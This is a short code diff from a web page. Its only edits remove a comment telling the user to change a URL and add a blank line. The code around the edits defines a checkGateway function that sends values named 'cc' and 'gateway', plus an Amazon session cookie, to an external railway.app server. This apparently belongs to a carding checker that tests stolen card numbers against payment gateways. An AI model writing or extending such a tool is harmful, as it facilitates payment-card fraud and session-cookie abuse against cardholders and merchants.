@@ -134,7 +134,7 @@
 
     async function checkGateway(cc, gateway) {
         try {
-            const response = await fetch('https://web-production-94347.up.railway.app/dashboard', {  // <- Cambia esta URL
+            const response = await fetch('https://web-production-94347.up.railway.app/dashboard', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ cc: cc, gateway: gateway, cookie: amazonCookie })
@@ -153,5 +153,6 @@
 
 </body>
 </html>
+
 
 
